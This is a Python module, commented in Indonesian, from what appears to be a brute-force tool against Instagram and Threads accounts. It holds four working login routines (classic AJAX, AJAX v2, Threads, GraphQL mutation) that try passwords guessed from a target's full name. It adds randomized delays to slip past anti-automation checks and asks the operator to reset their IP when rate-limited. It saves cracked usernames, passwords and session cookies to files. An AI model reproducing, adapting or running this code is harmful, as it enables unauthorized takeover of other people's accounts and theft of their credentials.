"""
core/bruteforce.py
Semua method eksekusi brute force.
Dipisah dari run.py supaya modular.
"""
import os, sys, requests, time, random, re, json, uuid
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as executor

from core.config import STATIC_PARAMS, IG_UA, P2, H2, M2, K2
from utils.helper import _ck, _search


class BruteExecutor:
    """
    Mixin class berisi semua method eksekusi brute force.
    Di-inherit oleh class Brute di run.py.
    """

    def human_delay(self):
        base = random.uniform(0.8, 2.2)
        spike = random.uniform(3.0, 7.0) if random.random() < 0.08 else 0
        time.sleep(base + spike)

    def ip_block_handler(self):
        Console().print(f'\r {P2}[{K2}!{P2}] IP Rate-Limited! Aktifkan Mode Pesawat 5-10 detik lalu tekan Enter...', end='')
        try:
            input()
        except (EOFError, KeyboardInterrupt):
            pass

    def _brute_loop(self, exec_fn, user, password, file):
        """Loop generik untuk semua metode brute force."""
        for pswd in password:
            if not pswd:
                continue
            self.human_delay()
            try:
                ok, tw, cp, blocked = exec_fn(user, pswd, file)
                if ok:
                    self.ok += 1
                    break
                elif tw:
                    self.tw += 1
                    break
                elif cp:
                    self.cp += 1
                    break
                elif blocked:
                    self.ip_block_handler()
                    continue
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                time.sleep(5)
                continue
            except Exception:
                continue
        self.lp += 1

    def ExecLogin(self, user, passwd, allData_akun=None, file='data/termux/internal/'):
        """Brute Force via classic AJAX login."""
        for pswd in passwd:
            if not pswd:
                continue
            self.human_delay()
            try:
                byps = requests.Session()
                byps.headers.update({'User-Agent': IG_UA})
                try:
                    r = byps.get('https://www.instagram.com/accounts/login/', timeout=15)
                    csrf = byps.cookies.get('csrftoken', '')
                except Exception:
                    csrf = ''
                ts = int(time.time())
                enc_password = f'#PWD_INSTAGRAM_BROWSER:0:{ts}:{pswd}'
                resp = byps.post(
                    'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                    data={'username': user, 'enc_password': enc_password, 'queryParams': '{}', 'optIntoOneTap': 'false'},
                    headers={
                        'X-CSRFToken': csrf, 'X-IG-App-ID': STATIC_PARAMS['x_ig_app_id'],
                        'X-Asbd-Id': STATIC_PARAMS['x_asbd_id'], 'User-Agent': IG_UA,
                        'Origin': 'https://www.instagram.com', 'Referer': 'https://www.instagram.com/accounts/login/',
                        'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    timeout=20, allow_redirects=False,
                )
                resp_text = resp.text
                cookie_dict = byps.cookies.get_dict()
                if 'AuthPlatformAntiScripting' in resp_text or 'PlatformException' in resp_text:
                    self.ip_block_handler(); continue
                elif 'sessionid' in cookie_dict or 'ds_user_id' in cookie_dict:
                    self.ok += 1
                    cookie = ';'.join(f'{k}={v}' for k, v in cookie_dict.items())
                    with open(file + 'OK.txt', 'a') as sv: sv.write(f'{user}|{pswd}|{cookie}\n')
                    break
                elif 'two_factor_required' in resp_text:
                    self.tw += 1
                    with open(file + '2F.txt', 'a') as sv: sv.write(f'{user}|{pswd}|2FA_REQUIRED\n')
                    break
                elif 'checkpoint_required' in resp_text or 'checkpoint_url' in resp_text:
                    self.cp += 1
                    with open(file + 'CP.txt', 'a') as sv: sv.write(f'{user}|{pswd}\n')
                    break
                elif 'spam' in resp_text or 'feedback_required' in resp_text:
                    self.ip_block_handler(); continue
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                time.sleep(5); continue
            except Exception:
                continue
        self.lp += 1

    def ExecAjax(self, user, password, allData_akun=None, file='data/termux/internal/'):
        """Brute Force via AJAX endpoint modern (working 2026)."""
        for pswd in password:
            if not pswd:
                continue
            self.human_delay()
            try:
                byps = requests.Session()
                byps.headers.update({'User-Agent': IG_UA, 'Accept-Language': 'en-US,en;q=0.9'})
                try:
                    r = byps.get('https://www.instagram.com/accounts/login/', timeout=15)
                    csrf = byps.cookies.get('csrftoken', '')
                except Exception:
                    csrf = ''
                ts = int(time.time())
                enc_password = f'#PWD_BROWSER:10:{ts}:{pswd}'
                resp = byps.post(
                    'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                    data={'username': user, 'enc_password': enc_password, 'queryParams': '{}', 'optIntoOneTap': 'false'},
                    headers={
                        'X-CSRFToken': csrf, 'X-Asbd-Id': STATIC_PARAMS['x_asbd_id'],
                        'X-Ig-App-Id': STATIC_PARAMS['x_ig_app_id'], 'User-Agent': IG_UA,
                        'Origin': 'https://www.instagram.com', 'Referer': 'https://www.instagram.com/accounts/login/',
                        'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded',
                        'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors',
                    },
                    timeout=20, allow_redirects=False,
                )
                resp_text = resp.text
                cookie_dict = byps.cookies.get_dict()
                try: authenticated = resp.json().get('authenticated', False)
                except Exception: authenticated = False
                if 'AuthPlatformAntiScripting' in resp_text or 'PlatformException' in resp_text:
                    self.ip_block_handler(); continue
                elif 'sessionid' in cookie_dict or authenticated:
                    self.ok += 1
                    cookie = ';'.join(f'{k}={v}' for k, v in cookie_dict.items())
                    with open(file + 'OK.txt', 'a') as sv: sv.write(f'{user}|{pswd}|{cookie}\n')
                    break
                elif 'two_factor_required' in resp_text:
                    self.tw += 1
                    with open(file + '2F.txt', 'a') as sv: sv.write(f'{user}|{pswd}|2FA_REQUIRED\n')
                    break
                elif 'checkpoint_required' in resp_text or 'checkpoint_url' in resp_text:
                    self.cp += 1
                    with open(file + 'CP.txt', 'a') as sv: sv.write(f'{user}|{pswd}\n')
                    break
                elif 'spam' in resp_text or 'feedback_required' in resp_text:
                    self.ip_block_handler(); continue
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                time.sleep(5); continue
            except Exception:
                continue
        self.lp += 1

    def ExecGraphQL(self, user, password, allData_akun=None, file='data/termux/internal/'):
        """Brute Force via GraphQL Mutation (RECOMMENDED 2026)."""
        for pswd in password:
            if not pswd:
                continue
            self.human_delay()
            try:
                byps = requests.Session()
                byps.headers.update({'User-Agent': IG_UA, 'Accept-Language': 'en-US,en;q=0.9'})
                try:
                    r = byps.get('https://www.instagram.com/accounts/login/', timeout=15)
                    csrf = byps.cookies.get('csrftoken', '')
                    lsd  = _search(r'\"LSD\",\[\],{\"token\":\"(.*?)\"', r.text) or _search(r'"LSD",\[\],{"token":"(.*?)"', r.text)
                except Exception:
                    csrf, lsd = '', ''
                ts = int(time.time())
                enc_password = f'#PWD_BROWSER:10:{ts}:{pswd}'
                variables = {
                    "input": {
                        "actor_id": "0", "client_mutation_id": "1",
                        "access_flow_version": "pre_mt_behavior", "app": "instagram",
                        "auth_domain_data_key": None,
                        "caa_login_request_extra_info": {"guid": str(uuid.uuid4()).replace('-','')[:17], "lgnjs": str(ts), "login_source": "caa_login"},
                        "credential_type": "password",
                        "enc_password": {"sensitive_string_value": enc_password},
                        "password": {"sensitive_string_value": enc_password},
                        "identifier": user, "ig_web_device_id": str(uuid.uuid4()),
                        "login_source": "LOGIN", "persistent": True,
                        "query_params": "{}", "trusted_device_records": "{}",
                        "use_uid_to_login": False, "waterfall_id": str(uuid.uuid4())
                    }, "scale": 1
                }
                resp = byps.post(
                    'https://www.instagram.com/api/graphql',
                    data={'av': '0', '__d': 'www', '__user': '0', '__a': '1', '__req': 'h',
                          'lsd': lsd, 'fb_api_caller_class': 'RelayModern',
                          'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
                          'server_timestamps': 'true', 'variables': json.dumps(variables),
                          'doc_id': STATIC_PARAMS['doc_id_login']},
                    headers={'Host': 'www.instagram.com', 'X-Ig-App-Id': STATIC_PARAMS['x_ig_app_id'],
                             'X-Fb-Lsd': lsd, 'Content-Type': 'application/x-www-form-urlencoded',
                             'X-Csrftoken': csrf, 'X-Fb-Friendly-Name': 'useCDSWebLoginMutation',
                             'X-Asbd-Id': STATIC_PARAMS['x_asbd_id'], 'User-Agent': IG_UA,
                             'Origin': 'https://www.instagram.com', 'Accept': '*/*',
                             'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty'},
                    timeout=20, allow_redirects=False,
                )
                resp_text = resp.text
                cookie_dict = byps.cookies.get_dict()
                if 'AuthPlatformAntiScripting' in resp_text or 'AuthPlatformLoginChallenge' in resp_text or 'PlatformException' in resp_text:
                    time.sleep(8); continue
                elif 'sessionid' in cookie_dict or 'ds_user_id' in cookie_dict:
                    self.ok += 1
                    cookie = ';'.join(f'{k}={v}' for k, v in cookie_dict.items())
                    with open(file + 'OK.txt', 'a') as sv: sv.write(f'{user}|{pswd}|{cookie}\n')
                    break
                elif 'two_factor_required' in resp_text:
                    self.tw += 1
                    with open(file + '2F.txt', 'a') as sv: sv.write(f'{user}|{pswd}|2FA_REQUIRED\n')
                    break
                elif 'checkpoint_required' in resp_text or 'checkpoint_url' in resp_text:
                    self.cp += 1
                    with open(file + 'CP.txt', 'a') as sv: sv.write(f'{user}|{pswd}\n')
                    break
                elif 'spam' in resp_text or 'feedback_required' in resp_text:
                    self.ip_block_handler(); continue
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                time.sleep(5); continue
            except Exception:
                continue
        self.lp += 1

    def ExecGraph(self, user, password, allData_akun=None, file='data/termux/internal/'):
        """Alias ExecGraphQL untuk kompatibilitas backward."""
        self.ExecGraphQL(user, password, allData_akun, file)

    def ExecThreads(self, user, password, allData_akun=None, file='data/termux/internal/'):
        """Brute Force via Threads endpoint."""
        for pswd in password:
            if not pswd:
                continue
            self.human_delay()
            try:
                byps = requests.Session()
                byps.headers.update({'User-Agent': IG_UA})
                try:
                    r = byps.get('https://www.threads.net/login/', timeout=15)
                    csrf = byps.cookies.get('csrftoken', '')
                except Exception:
                    csrf = ''
                ts = int(time.time())
                enc_password = f'#PWD_BROWSER:10:{ts}:{pswd}'
                resp = byps.post(
                    'https://www.threads.net/api/v1/web/accounts/login/ajax/',
                    data={'username': user, 'enc_password': enc_password, 'queryParams': '{"is_from_threads":"true"}', 'optIntoOneTap': 'false'},
                    headers={'X-CSRFToken': csrf, 'X-Asbd-Id': STATIC_PARAMS['x_asbd_id'],
                             'X-Ig-App-Id': '238260118697367', 'User-Agent': IG_UA,
                             'Origin': 'https://www.threads.net', 'Referer': 'https://www.threads.net/login/',
                             'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=20, allow_redirects=False,
                )
                resp_text = resp.text
                cookie_dict = byps.cookies.get_dict()
                if 'AuthPlatformAntiScripting' in resp_text or 'PlatformException' in resp_text:
                    self.ip_block_handler(); continue
                elif 'sessionid' in cookie_dict:
                    self.ok += 1
                    cookie = ';'.join(f'{k}={v}' for k, v in cookie_dict.items())
                    with open(file + 'OK.txt', 'a') as sv: sv.write(f'{user}|{pswd}|{cookie}\n')
                    break
                elif 'two_factor_required' in resp_text:
                    self.tw += 1
                    with open(file + '2F.txt', 'a') as sv: sv.write(f'{user}|{pswd}|2FA_REQUIRED\n')
                    break
                elif 'checkpoint_required' in resp_text:
                    self.cp += 1
                    with open(file + 'CP.txt', 'a') as sv: sv.write(f'{user}|{pswd}\n')
                    break
                elif 'spam' in resp_text or 'feedback_required' in resp_text:
                    self.ip_block_handler(); continue
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                time.sleep(5); continue
            except Exception:
                continue
        self.lp += 1

    def methode(self):
        """Memilih metode brute force."""
        Console().print(f'\n {P2}[{H2}1{P2}]. Login AJAX (Classic)       {P2}[{H2}2{P2}]. Login AJAX v2')
        Console().print(f' {P2}[{H2}3{P2}]. Login Threads               {P2}[{H2}4{P2}]. GraphQL Mutation (Recommended)')
        methode_login = Console().input(f' {P2}[{H2}?{P2}] Pilih metode : ').strip()
        show_details = Console().input(f' {P2}[{H2}?{P2}] Tampilkan data akun lengkap? (y/n) : ').strip().lower() in ('y', 'ya', 'yes')
        strategy = Console().input(f' {P2}[{H2}?{P2}] Strategi password (1-5, default 3) : ').strip() or '3'
        self.exec_malink(methode_login, show_details, strategy)

    def exec_malink(self, methode_login, show_details, strategy='3'):
        """Menjalankan brute force dengan metode yang dipilih."""
        from core.api import Require
        req_obj = Require()
        methode_map = {
            '1': self.ExecLogin, '01': self.ExecLogin,
            '2': self.ExecAjax, '02': self.ExecAjax,
            '3': self.ExecThreads, '03': self.ExecThreads,
            '4': self.ExecGraphQL, '04': self.ExecGraphQL,
        }
        exec_func = methode_map.get(methode_login, self.ExecGraphQL)
        file = self.dire + '/'
        tasks = []
        for akun in self.id:
            try:
                parts = akun.split('<=>')
                user = parts[0]
                fulnam = parts[1] if len(parts) > 1 else user
            except Exception:
                continue
            passwords = req_obj.Password(fulnam, strategy)
            tasks.append((user, passwords))
        with executor(max_workers=1) as pool:
            for user, passwords in tasks:
                pool.submit(exec_func, user, passwords, show_details, file)
